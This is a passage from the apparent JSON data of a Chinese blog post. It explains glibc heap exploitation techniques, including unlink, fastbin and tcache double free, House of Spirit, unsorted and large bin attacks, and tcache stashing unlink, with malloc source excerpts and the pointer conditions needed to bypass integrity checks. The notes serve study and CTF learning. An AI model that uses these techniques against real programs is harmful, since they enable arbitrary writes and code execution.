时，如果是mmap的chunk，会单独处理。\n- fake chunk**地址需要对齐**。\n- fake chunk的next chunk的大小**不能小于2 * SIZE_SZ**，同时也**不能大于av->system_mem** 。\n\n#### Tcache Stashing Unlink Attack\n\n这种攻击利用的是tcache有**剩余**时，同大小的small bin会放进tcache中。在获取到一个smallbin中的一个chunk后会如果tcache仍有足够空闲位置，会将**剩余的**small bin链入tcache，在这个过程中**只对第一个bin进行了完整性检查**。\n\n\n当攻击者可以写一个small bin的bk指针时，其可以在任意地址上写一个libc地址 (类似 unsorted bin attack 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。\n\n而calloc分配堆块时**不从tcache中选取，直接从small bin中取**，可以触发攻击。\n\n具体利用：\n\n想办法改写smallbin中**倒数第二个chunk的bk**指向fake chunk，在利用calloc取出了small bin中的一个chunk后，剩余的chunk会放入tcache中。Small bin遵循**FIFO**，**利用bk进行遍历**，因此倒数第二个chunk会先放入tcache，fake chunk会后放入tcache。由于tcache遵循**LIFO**，因此此时处于tcache头的是fake chunk，下一次malloc即可得到其内存。\n\n#### libc leak\n\n算是tcache带来的一点点麻烦，要用到bin的话需要先将对应的tcache填满。\n","slug":"heap_attack","published":1,"updated":"2023-03-19T11:44:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafz003o5oudfcosesh3","content":"<p>堆的利用方式非常多，但大多都不能直接获得shell，而是通过<strong>改变程序流程</strong>或者获得<strong>任意写</strong>再利用其它方式获得shell（如修改hook为one_gadget，FSOP等等）。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"堆溢出\"><a href=\"#堆溢出\" class=\"headerlink\" title=\"堆溢出\"></a>堆溢出</h3><p>和栈溢出类似，堆溢出漏洞源于程序没有对写入的数据长度进行合理的控制，导致<strong>程序向chunk中写入了超出其可使用大小的数据</strong>(可使用大小不一定等于申请的大小，如large bin的切割机制导致了可使用的大小会大于申请的大小)。</p>\n<p>不同与栈溢出，堆溢出无法直接控制返回地址，其利用主要如下：</p>\n<ol>\n<li>覆盖<strong>物理地址上后面</strong>的chunk的内容（如prev_size,size及其标志位,chunk中保存的内容）。</li>\n<li>协助其它机制实现任意写（如unlink），通常是修改fd,bk,fd_nextsize,bkk_nextsize。</li>\n</ol>\n<h3 id=\"堆的Off-By-One\"><a href=\"#堆的Off-By-One\" class=\"headerlink\" title=\"堆的Off-By-One\"></a>堆的Off-By-One</h3><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，即<strong>仅仅溢出了一个字节</strong>，通常在程序的边界检查不严格（循环设置出错）和字符串操作（没有注意末尾的’\\x00’）中出现。</p>\n<p>利用方式：</p>\n<ol>\n<li>溢出字节为可控制任意字节：通过修改size造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</li>\n<li>溢出字节为NULL：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_inuse 位被清，这样前块会被认为是free块。<br> （1）这时可以选择使用 nlink方法进行处理。<br> （2）另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。（旧的unlink没有检查按照 prev_size 找到的块的大小与prev_size 是否一致）。</li>\n</ol>\n<p><code>libc-2.29</code>增加了检测<code>next chunk</code>的<code>prev_size</code>，会报错：<code>malloc(): mismatching next-&gt;prev_size (unsorted)</code>，也增加了检测<code>next chunk</code>的地址是不是个堆块，会报错<code>malloc(): invalid next size (unsorted)</code>。<br><code>libc-2.23(11)</code>的版本，当释放某一个非<code>fast bin</code>的堆块时，若上/下某堆块空闲，则会检测该空闲堆块的<code>size</code>与其<code>next chunk</code>的<code>prev_size</code>是否相等。</p>\n<h3 id=\"chunk-extend-and-overlapping（好像还有chunk-shrink的，但没找资料）\"><a href=\"#chunk-extend-and-overlapping（好像还有chunk-shrink的，但没找资料）\" class=\"headerlink\" title=\"chunk extend and overlapping（好像还有chunk shrink的，但没找资料）\"></a>chunk extend and overlapping（好像还有chunk shrink的，但没找资料）</h3><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。实现overlapping之后，不但可以读取<strong>已经free了的chunk的数据来泄露</strong>信息（如unsorted bin头的main_arena+96），还可以对<strong>bin或tcache中的chunk的内容进行修改</strong>（如修改fd,bk）来协助进行其它攻击。</p>\n<p>chunk extend的原理在于：<strong>ptmalloc通过prev_size和size的内容判断chunk的使用情况和对chunk的前后块进行定位</strong>。简而言之，chunk extend通过<strong>控制size和prev_size</strong>来实现overlapping。实现chunk extend的前提是：能够控制size或prev_size。</p>\n<p>利用方法：</p>\n<ol>\n<li>将chunk的size位改大，使其包含下一个chunk的内容后，将其释放。这样会将两个chunk一起释，再次请求可将两个chunk的内存一起请求回来，导致第二个chunk能在两个地方被控制，从而实现overlapping。</li>\n<li>将已经释放的chunk的size位改大，这样malloc的时候就能把后面的内存一并申请出来，实现overlapping。（与1.类似）</li>\n<li>修改chunk的prev_size和prev_inuse位，通过free前向合并时通过prev_size去定位，合并没有被释放的内存，实现overlappping。</li>\n</ol>\n<h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><p>对unlink的利用，其实是对chunk进行内存布局，然后借助unlink操作来达成<strong>修改指针</strong>的效果。</p>\n<p>如果不考虑保护和针对large bin的操作的话，unlink主要的操作是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//P是要取出的chunk</span></span><br><span class=\"line\">FD=P-&gt;fd;<span class=\"comment\">//FD为P的下一个chunk</span></span><br><span class=\"line\">BK=P-&gt;bk;<span class=\"comment\">//BK为P的前一个chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在fd和bk的双向链表中去掉P</span></span><br><span class=\"line\">FD-&gt;bk=BK;</span><br><span class=\"line\">BK-&gt;fd=FD;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>重点在于后面对bk和fd的修改:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//在fd和bk的双向链表中去掉P</span></span><br><span class=\"line\">FD-&gt;bk=BK;</span><br><span class=\"line\">BK-&gt;fd=FD;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//等价于</span></span><br><span class=\"line\">*(FD+<span class=\"number\">0x18</span>)=BK</span><br><span class=\"line\">*(BK+<span class=\"number\">0x10</span>)=FD</span><br></pre></td></tr></table></figure>\n\n<p>因此，如果我们能让FD，即<strong>FD指向目标地址addr-0x18的位置，并且BK为我们想要修改为的内容value</strong>，而且*(value+0x10)可写，那么我们就可以修改addr为我们指定的内容value。（比如可以修改GOT表项）</p>\n<p>然而现在的libc中，<strong>进行赋值之前</strong>有对fd和bk的检查:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// fd bk</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"number\">0</span>))                      </span><br><span class=\"line\">  malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br></pre></td></tr></table></figure>\n\n<p>为了绕过检查，我们需要伪造FD和BK，使其满足下列条件之后才能赋值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(fakeFD+<span class=\"number\">0x18</span>)==P==*(fakeBK+<span class=\"number\">0x10</span>)</span><br><span class=\"line\"><span class=\"comment\">//因此fakeFD=&amp;P-0x18</span></span><br><span class=\"line\"><span class=\"comment\">//fakeBK=&amp;P-0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>执行unlink时</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*(fakeFD+<span class=\"number\">0x18</span>)=fakeBK</span><br><span class=\"line\">*(fakeBK+<span class=\"number\">0x10</span>)=fakeFD</span><br><span class=\"line\"><span class=\"comment\">//由于*(FD+0x18)==P==*(BK+0x10)</span></span><br><span class=\"line\"><span class=\"comment\">//因此等价于</span></span><br><span class=\"line\"><span class=\"comment\">//*P=&amp;P-0x10</span></span><br><span class=\"line\"><span class=\"comment\">//*P=&amp;P-0x18</span></span><br></pre></td></tr></table></figure>\n\n<p>最终*P=&amp;P-0x18，即P指向了比原来低0x18的位置。</p>\n<p>通过这种方法，如果我们能控制small bin或unsorted bin中chunk的fd和bk，并且我们能知道这个chunk的地址，那么就可以利用unlink使得该chunk指针ptr指向ptr-0x18的位置。</p>\n<p>过程：</p>\n<ol>\n<li>修改ptr-&gt;fd=ptr-0x18</li>\n<li>修改ptr-&gt;bk=ptr-0x10</li>\n<li>触发unlink</li>\n</ol>\n<h3 id=\"Use-After-Free-UAF\"><a href=\"#Use-After-Free-UAF\" class=\"headerlink\" title=\"Use After Free(UAF)\"></a>Use After Free(UAF)</h3><p>就像它的名字一样，UAF指的是1个chunk被释放后被使用，主要有2种情况：</p>\n<ol>\n<li>chunk被释放后，对应的指针赋值为NULL，但其他函数执行前没有进行检查，仍会对其进行操作，导致程序崩溃。</li>\n<li>chunk被释放后，对应的指针没有被赋NULL，此时其他函数可以正常对该chunk进行操作。</li>\n</ol>\n<p>一般第2种情况是我们利用的。UAF需要搭配其他方法进行使用，比如根据unsorted bin chunk的特性，用函数输出已经释放的chunk中的内容，从而泄露信息；或者用来修改fast bin chunk的fd，达到fast bin attack…</p>\n<h3 id=\"Fast-bin-Attack\"><a href=\"#Fast-bin-Attack\" class=\"headerlink\" title=\"Fast bin Attack\"></a>Fast bin Attack</h3><p>Fastbin Attack通常指基于fastbin机制的利用，利用的前提是：</p>\n<ul>\n<li>存在堆溢出或UAF等能控制chunk内容的漏洞</li>\n<li>漏洞发生于fast bin chunk</li>\n</ul>\n<p>Fastbin Attack主要利用的是fastbin的特殊机制，fastbin是使用<strong>单链表(fd)<strong>来维护释放的堆块的，并且由fastbin管理的 chunk</strong>即使被释放，其next_chunk的prev_inuse位也不会被清空</strong>。 </p>\n<h4 id=\"Fastbin-Double-Free\"><a href=\"#Fastbin-Double-Free\" class=\"headerlink\" title=\"Fastbin Double Free\"></a>Fastbin Double Free</h4><p>Fastbin Double Free通过对1个chunk的多次释放，改变fast bin中fd的指向。其利用的主要是<strong>fastbin不会清空prev_inuse位</strong>，并且在释放时，<strong>只检查当前释放的chunk与bin头结点指向的chunk是否相同</strong>，而没有检查后续的chunk的机制。</p>\n<p>因此，我们只要在两次释放之间隔着一个不同的chunk，就可以实现Fastbin Double Free。</p>\n<p>在释放之后，fast bin的结构如下：</p>\n<p><img src=\"./heap_attack/FastbinDoubleFree.png\" alt=\"FastbinDoubleFree\"></p>\n<p>在1次malloc之后，我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。如果<strong>更进一步修改 fd 指针</strong>，则能够实现<strong>任意地址分配堆块</strong>的效果 (首先要通过验证，即size符合当前fast bin的大小)，这就相当于任意地址任意写的效果。</p>\n<h4 id=\"House-of-Spirit\"><a href=\"#House-of-Spirit\" class=\"headerlink\" title=\"House of Spirit\"></a>House of Spirit</h4><p>House of Spirit是通过在目标位置<strong>伪造</strong>fastbin chunk，并让其被释放，从而达到<strong>申请指定地址内存</strong>的目的。</p>\n<p>由于free的特性，House of Spirit的重点在于<strong>修改指定地址前后的内容使其能绕过free的检测</strong>。</p>\n<p>需要的绕过：</p>\n<ul>\n<li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为 free 时，如果是mmap的chunk，会单独处理。</li>\n<li>fake chunk<strong>地址需要对齐</strong>。</li>\n<li>fake chunk的<strong>size大小需要满足对应的fastbin</strong> 的需求，同时也得<strong>对齐</strong>。</li>\n<li>fake chunk的next chunk的大小<strong>不能小于2 * SIZE_SZ</strong>，同时也<strong>不能大于av-&gt;system_mem</strong> 。</li>\n<li>fake chunk对应的fastbin<strong>链表头部不能是该fake chunk</strong>，即不能构成double free的情况。</li>\n</ul>\n<p>在达成条件之后，将该fake chunk释放，再重新malloc就能得到该部分内存。</p>\n<h4 id=\"Arbitrary-Alloc\"><a href=\"#Arbitrary-Alloc\" class=\"headerlink\" title=\"Arbitrary Alloc\"></a>Arbitrary Alloc</h4><p>由于fast bin中通过fd指向下一个chunk，如果我们<strong>将想要获取的内存看作一个fake chunk</strong>，那么只要其<strong>size的大小满足fast bin的要求</strong>，并且<strong>控制fast bin中的fd指向fake chunk</strong>，那么我们就能将这个fake chunk申请过来，实现任意读或任意写。</p>\n<p>要让size满足要求，我们可以<strong>逐字节进行调节（参考malloc到__malloc_hook的过程）</strong>，找到在fast bin size范围内的大小，且能包含我们想要的内存即可。（由于不用绕过free，可以不用对齐）</p>\n<p>要控制fast bin中chunk的fd，可以利用Fastbin Double Free、UAF、overlapping、堆溢出等方法。</p>\n<h3 id=\"Unsorted-bin-Attack\"><a href=\"#Unsorted-bin-Attack\" class=\"headerlink\" title=\"Unsorted bin Attack\"></a>Unsorted bin Attack</h3><p>Unsorted bin Attack是对unsorted bin机制的利用。</p>\n<h4 id=\"Unsorted-bin-Leak\"><a href=\"#Unsorted-bin-Leak\" class=\"headerlink\" title=\"Unsorted bin Leak\"></a>Unsorted bin Leak</h4><p>Unsort bin Leak主要是利用了unsorted bin使用<strong>fd和bk的双向链表</strong>管理chunk的机制，<strong>始终会有一个chunk的fd和一个chunk的bk指向unsorted bin的头结点，而头结点在main_arena内部</strong>，与main_arena的偏移是固定的(96)。特别的，当只有1个chunk的时候，这个chunk的fd和bk都会指向一个unsorted bin的头结点。</p>\n<p>因此，借助UAF、overlapping等方式，我们可以泄露unsorted bin头结点的地址，从而得到main_arena，再利用与main_arena固定偏移0x10的__malloc_hook得到出libc。（也可以通过malloc_trim()函数得出）</p>\n<h4 id=\"Unsorted-bin-Attack-1\"><a href=\"#Unsorted-bin-Attack-1\" class=\"headerlink\" title=\"Unsorted bin Attack\"></a>Unsorted bin Attack</h4><p>Unsorted bin Attack利用了unsorted bin的特性，当一个chunk从unsorted bin中取出的时候，会将unsorted bin的地址写入到bck-&gt;fd的位置（bck==P-&gt;bk）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//相当于将unsorted bin放在了victim的位置，修改bck和bin的fd和bk指针</span></span><br><span class=\"line\">bck = victim-&gt;bk;</span><br><span class=\"line\">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class=\"line\">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>\n\n<p>换而言之，如果我们能<strong>控制一个unsorted bin chunk的bk</strong>，并且将其取出，那么就能<strong>在bk+0x10的位置写入unsorted bin的地址</strong>。这个地址通常是一个<strong>很大的值</strong>，借助这点，我们可以<strong>控制程序执行流程</strong>（改变判断条件，修改循环次数），甚至可以修改heap中的global_max_fast来<strong>使得更大的chunk可以被视为fast bin</strong>，这样我们就可以去执行一些fast bin attack了。</p>\n<h3 id=\"Large-bin-Attack\"><a href=\"#Large-bin-Attack\" class=\"headerlink\" title=\"Large bin Attack\"></a>Large bin Attack</h3><p>Large bin Attack利用的是chunk从unsorted bin进入到large bin时缺少检查。当malloc遍历unsorted bin时，如果该chunk<strong>不是刚好满足大小并且不满足切割条件</strong>的话，则会放入对应的bin中。而在放入large bin的时候，缺少了对nextsize指针的检查。通过Large bin Attack，可以<strong>将当前chunk的地址写入bk_nextsize+0x20的位置</strong>（类似unsorted bin attack）。</p>\n<p>在2.29及以下版本的glibc中，根据chunk的大小有不同的利用。</p>\n<p>如果chunk<strong>小于</strong>该large bin中最小的chunk的时候会执行:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fwd = bck; <span class=\"comment\">//使得fwd=large bin</span></span><br><span class=\"line\">bck = bck-&gt;bk; <span class=\"comment\">//使得bck=末尾的chunk(最小的chunk)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//下面均没有对victim的nextsize指针进行检测就直接赋值了</span></span><br><span class=\"line\">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class=\"line\">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class=\"line\">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\"><span class=\"comment\">//fwd为当前chunk的fd指向的chunk，在这种情况下为large bin头，victim为当前chunk</span></span><br><span class=\"line\"><span class=\"comment\">//这条语句的作用是：修改通过nextsize指针连接的相邻chunk的fd_nextsize和bk_nextsize，即在nextsize list中插入新的chunk</span></span><br></pre></td></tr></table></figure>\n\n<p>如果chunk<strong>大于</strong>该large bin中最小的chunk的时候会执行:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>\n\n<p>如果chunk<strong>等于</strong>该large bin中最小的chunk，则会使用其他方法插入，所以此时无法利用。</p>\n<p>在2.30版本新加入了对largebin跳表的完整性检查，使chunk大于链表中最小的chunk时的利用失效，必须使chunk<strong>小于</strong>链表中最小的chunk，通过下面的语句将当前chunk的地址写入bk_nextsize+0x20的位置。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>\n\n<p>Large bin Attack的条件：</p>\n<ol>\n<li>可以修改一个large bin chunk的 data</li>\n<li>从unsorted bin中来的large bin chunk要紧跟在被构造过的chunk的后面</li>\n</ol>\n<p>作用：</p>\n<ol>\n<li>通过large bin attack可以辅助Tcache Stash Unlink+攻击</li>\n<li>可以修改_IO_list_all便于伪造_IO_FILE 结构体进行FSOP。</li>\n</ol>\n<h3 id=\"Tcache-Attack\"><a href=\"#Tcache-Attack\" class=\"headerlink\" title=\"Tcache Attack\"></a>Tcache Attack</h3><p>由于Tcache本身检查约等于0，因此Tcache的利用都方便许多。其本身可以看作是没有什么检查的fast bin。</p>\n<h4 id=\"Tcache-Poisoning\"><a href=\"#Tcache-Poisoning\" class=\"headerlink\" title=\"Tcache Poisoning\"></a>Tcache Poisoning</h4><p>主要利用的是tcache_get()从tcache中获取chunk的时候几乎没有检查，会利fd指针逐个取出chunk。因此，只需要<strong>将tcache中的chunk的fd指向任意内存即可将其取出</strong>。</p>\n<h4 id=\"Tcache-Dup（Tcache-Double-free）\"><a href=\"#Tcache-Dup（Tcache-Double-free）\" class=\"headerlink\" title=\"Tcache Dup（Tcache Double free）\"></a>Tcache Dup（Tcache Double free）</h4><p>类似于fast bin dup(Fast bin Double free)，不过利用的是tcache_put()中的不严谨，<strong>可以直接连续free同一个chunk来做到double free</strong>。</p>\n<p>但在glibc2.29之后，tcache中增加了对此的检查，会在tcache_entry中引入一个标志key，表示chunk是否已经在该tcache bin中，每个chunk在放入tcache时都会检查key。</p>\n<p>即便如此有些方法能绕过检查的，不过需要利用fast bin double free和tcache stash机制。</p>\n<p>(1) 首先需要将tcache填满并实现fast bin double free</p>\n<p><code>tcache</code>中为：<code>C6-&gt;C5-&gt;C4-&gt;C3-&gt;C2-&gt;C1-&gt;C0</code>，<code>fast bin</code>中为：<code>C7-&gt;C8-&gt;C7</code>。</p>\n<p>(2) 之后，为了分配到<code>fast bin</code>，需要先申请<code>7</code>个，让<code>tcache</code>为空（或<code>calloc</code>），再次申请时就会返回<code>fast bin</code>中的<code>C7</code>，同时由于<code>tcache stash</code>机制，<code>fast bin</code>中剩下的<code>C8</code>,<code>C7</code>均被放入了<code>tcache bin</code>。此时，在<code>C7</code>的<code>fd</code>字段写入<code>target_addr</code>（相当于获得了<code>Edit</code>功能），于是<code>target_addr</code>也被放入了<code>tcache bin</code>，因此这里<code>target_addr</code>处甚至不需要伪造<code>size</code>（<code>target_addr</code>指向<code>user data</code>区）。<br>(3) 此时，<code>tcache bin</code>中单链表为：<code>C8-&gt;C7-&gt;target_addr</code>，再申请到<code>target_addr</code>，从而得到了一个真正的任意写。</p>\n<h4 id=\"Tcache-Perthread-Corruption\"><a href=\"#Tcache-Perthread-Corruption\" class=\"headerlink\" title=\"Tcache Perthread Corruption\"></a>Tcache Perthread Corruption</h4><p>tcache_perthread_struct是整个tcache的管理结构，而<strong>这个结构是存储在堆上</strong>的。如果能控制这个结构体，那么无论我们malloc的size是多少，地址都是可控的。不过这需要我们利用其它方法来申请到这块内存。</p>\n<h4 id=\"Tcache-House-Of-Spirit\"><a href=\"#Tcache-House-Of-Spirit\" class=\"headerlink\" title=\"Tcache House Of Spirit\"></a>Tcache House Of Spirit</h4><p>原理是House Of Spirit，不过由于tcache检查的松散，因此更容易利用，我们<strong>可以不用管prev_inuse位</strong>，但其他条件仍是需要满足的。</p>\n<p>如：</p>\n<ul>\n<li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为 free 时，如果是mmap的chunk，会单独处理。</li>\n<li>fake chunk<strong>地址需要对齐</strong>。</li>\n<li>fake chunk的next chunk的大小<strong>不能小于2 * SIZE_SZ</strong>，同时也<strong>不能大于av-&gt;system_mem</strong> 。</li>\n</ul>\n<h4 id=\"Tcache-Stashing-Unlink-Attack\"><a href=\"#Tcache-Stashing-Unlink-Attack\" class=\"headerlink\" title=\"Tcache Stashing Unlink Attack\"></a>Tcache Stashing Unlink Attack</h4><p>这种攻击利用的是tcache有<strong>剩余</strong>时，同大小的small bin会放进tcache中。在获取到一个smallbin中的一个chunk后会如果tcache仍有足够空闲位置，会将<strong>剩余的</strong>small bin链入tcache，在这个过程中<strong>只对第一个bin进行了完整性检查</strong>。</p>\n<p>当攻击者可以写一个small bin的bk指针时，其可以在任意地址上写一个libc地址 (类似 unsorted bin attack 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。</p>\n<p>而calloc分配堆块时<strong>不从tcache中选取，直接从small bin中取</strong>，可以触发攻击。</p>\n<p>具体利用：</p>\n<p>想办法改写smallbin中<strong>倒数第二个chunk的bk</strong>指向fake chunk，在利用calloc取出了small bin中的一个chunk后，剩余的chunk会放入tcache中。Small bin遵循<strong>FIFO</strong>，<strong>利用bk进行遍历</strong>，因此倒数第二个chunk会先放入tcache，fake chunk会后放入tcache。由于tcache遵循<strong>LIFO</strong>，因此此时处于tcache头的是fake chunk，下一次malloc即可得到其内存。</p>\n<h4 id=\"libc-leak\"><a href=\"#libc-leak\" class=\"headerlink\" title=\"libc leak\"></a>libc leak</h4><p>算是tcache带来的一点点麻烦，要用到bin的话需要先将对应的tcache填满。</p>\n","site":{"data":{}},"excerpt":"<p>堆的利用方式非常多，但大多都不能直接获得shell，而是通过<strong>改变程序流程</strong>或者获得<strong>任意写</strong>再利用其它方式获得shell（如修改hook为one_gadget，FSOP等等）。</p>","more":"<h3 id=\"堆溢出\"><a href=\"#堆溢出\" class=\"headerlink\" title=\"堆溢出\"></a>堆溢出</h3><p>和栈溢出类似，堆溢出漏洞源于程序没有对写入的数据长度进行合理的控制，导致<strong>程序向chunk中写入了超出其可使用大小的数据</strong>(可使用大小不一定等于申请的大小，如large bin的切割机制导致了可使用的大小会大于申请的大小)。</p>\n<p>不同与栈溢出，堆溢出无法直接控制返回地址，其利用主要如下：</p>\n<ol>\n<li>覆盖<strong>物理地址上后面</strong>的chunk的内容（如prev_size,size及其标志位,chunk中保存的内容）。</li>\n<li>协助其它机制实现任意写（如unlink），通常是修改fd,bk,fd_nextsize,bkk_nextsize。</li>\n</ol>\n<h3 id=\"堆的Off-By-One\"><a href=\"#堆的Off-By-One\" class=\"headerlink\" title=\"堆的Off-By-One\"></a>堆的Off-By-One</h3><p>严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，即<strong>仅仅溢出了一个字节</strong>，通常在程序的边界检查不严格（循环设置出错）和字符串操作（没有注意末尾的’\\x00’）中出现。</p>\n<p>利用方式：</p>\n<ol>\n<li>溢出字节为可控制任意字节：通过修改size造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</li>\n<li>溢出字节为NULL：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_inuse 位被清，这样前块会被认为是free块。<br> （1）这时可以选择使用 nlink方法进行处理。<br> （2）另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。（旧的unlink没有检查按照 prev_size 找到的块的大小与prev_size 是否一致）。</li>\n</ol>\n<p><code>libc-2.29</code>增加了检测<code>next chunk</code>的<code>prev_size</code>，会报错：<code>malloc(): mismatching next-&gt;prev_size (unsorted)</code>，也增加了检测<code>next chunk</code>的地址是不是个堆块，会报错<code>malloc(): invalid next size (unsorted)</code>。<br><code>libc-2.23(11)</code>的版本，当释放某一个非<code>fast bin</code>的堆块时，若上/下某堆块空闲，则会检测该空闲堆块的<code>size</code>与其<code>next chunk</code>的<code>prev_size</code>是否相等。</p>\n<h3 id=\"chunk-extend-and-overlapping（好像还有chunk-shrink的，但没找资料）\"><a href=\"#chunk-extend-and-overlapping（好像还有chunk-shrink的，但没找资料）\" class=\"headerlink\" title=\"chunk extend and overlapping（好像还有chunk shrink的，但没找资料）\"></a>chunk extend and overlapping（好像还有chunk shrink的，但没找资料）</h3><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。实现overlapping之后，不但可以读取<strong>已经free了的chunk的数据来泄露</strong>信息（如unsorted bin头的main_arena+96），还可以对<strong>bin或tcache中的chunk的内容进行修改</strong>（如修改fd,bk）来协助进行其它攻击。</p>\n<p>chunk extend的原理在于：<strong>ptmalloc通过prev_size和size的内容判断chunk的使用情况和对chunk的前后块进行定位</strong>。简而言之，chunk extend通过<strong>控制size和prev_size</strong>来实现overlapping。实现chunk extend的前提是：能够控制size或prev_size。</p>\n<p>利用方法：</p>\n<ol>\n<li>将chunk的size位改大，使其包含下一个chunk的内容后，将其释放。这样会将两个chunk一起释，再次请求可将两个chunk的内存一起请求回来，导致第二个chunk能在两个地方被控制，从而实现overlapping。</li>\n<li>将已经释放的chunk的size位改大，这样malloc的时候就能把后面的内存一并申请出来，实现overlapping。（与1.类似）</li>\n<li>修改chunk的prev_size和prev_inuse位，通过free前向合并时通过prev_size去定位，合并没有被释放的内存，实现overlappping。</li>\n</ol>\n<h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><p>对unlink的利用，其实是对chunk进行内存布局，然后借助unlink操作来达成<strong>修改指针</strong>的效果。</p>\n<p>如果不考虑保护和针对large bin的操作的话，unlink主要的操作是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//P是要取出的chunk</span></span><br><span class=\"line\">FD=P-&gt;fd;<span class=\"comment\">//FD为P的下一个chunk</span></span><br><span class=\"line\">BK=P-&gt;bk;<span class=\"comment\">//BK为P的前一个chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//在fd和bk的双向链表中去掉P</span></span><br><span class=\"line\">FD-&gt;bk=BK;</span><br><span class=\"line\">BK-&gt;fd=FD;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>重点在于后面对bk和fd的修改:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//在fd和bk的双向链表中去掉P</span></span><br><span class=\"line\">FD-&gt;bk=BK;</span><br><span class=\"line\">BK-&gt;fd=FD;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//等价于</span></span><br><span class=\"line\">*(FD+<span class=\"number\">0x18</span>)=BK</span><br><span class=\"line\">*(BK+<span 